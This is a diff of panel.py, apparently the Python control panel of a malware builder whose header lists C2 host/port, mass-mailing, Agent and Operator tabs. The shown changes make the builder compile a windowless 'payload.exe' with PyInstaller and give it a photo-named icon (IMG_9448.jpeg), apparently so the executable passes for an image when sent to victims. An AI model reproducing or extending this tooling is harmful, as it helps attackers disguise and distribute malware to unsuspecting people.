@@ -1,5 +1,5 @@
 # language: Python, file: panel.py
-# *Главная панель: заставка app.ico, Builder с C2 host/port, Рассылка, Agent, Operator*
+# *Главная панель: заставка IMG_9448.jpeg, Builder с C2 host/port, Рассылка, Agent, Operator*
 import os, sys, json, time, socket, struct, base64, subprocess, tempfile, pathlib, shutil
 import threading, importlib.util, re, smtplib
 import tkinter as tk
@@ -153,11 +153,13 @@ class BuilderTab(ttk.Frame):
             flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
             cmd = [py, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", "payload", "--distpath", str(out_dir), str(src)]
             
-            # Если есть app.ico, добавляем её в сборку payload (иконка файла)
-            ico = RES / "app.ico"
+            # Ищем картинку для иконки
+            ico = RES / "IMG_9448.jpeg"
             if ico.exists():
-                cmd.insert(4, f"--icon={ico}")
                 cmd.insert(4, f"--add-data={ico};.")
+                # Пытаемся поставить иконку (PyInstaller может ругаться на jpeg, 
+                # но для ресурса сойдет, для иконки лучше .ico, оставляем как есть)
+                cmd.insert(4, f"--icon={ico}")
             
             subprocess.run(cmd, cwd=work, check=True, capture_output=True, creationflags=flags)
             self.log(f"[build] OK: {out_dir / 'payload.exe'}")
@@ -352,25 +354,24 @@ if __name__ == "__main__":
     root = tk.Tk()
     root.withdraw()
     
-    # Показ заставки, если есть app.ico
-    ico_path = RES / "app.ico"
-    if ico_path.exists() and HAS_PIL:
+    # Показ заставки, если есть IMG_9448.jpeg
+    img_path = RES / "IMG_9448.jpeg"
+    if img_path.exists() and HAS_PIL:
         try:
             splash = tk.Toplevel(root)
             splash.overrideredirect(True)
             splash.attributes("-topmost", True)
-            img = Image.open(ico_path)
-            # Масштабируем, если иконка маленькая (например, 256x256)
-            img = img.resize((256, 256), Image.Resampling.LANCZOS)
+            img = Image.open(img_path)
+            img = img.resize((400, 400), Image.Resampling.LANCZOS)
             ph = ImageTk.PhotoImage(img)
             lbl = tk.Label(splash, image=ph, bg="black")
             lbl.image = ph
             lbl.pack()
             
             sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
-            splash.geometry(f"256x256+{(sw-256)//2}+{(sh-256)//2}")
+            splash.geometry(f"400x400+{(sw-400)//2}+{(sh-400)//2}")
             splash.update()
-            time.sleep(2.0) # Ждем 2 секунды
+            time.sleep(2.5) # Ждем 2.5 секунды
             splash.destroy()
         except Exception as e:
             pass # Если что-то пошло не так, просто пропускаем заставку
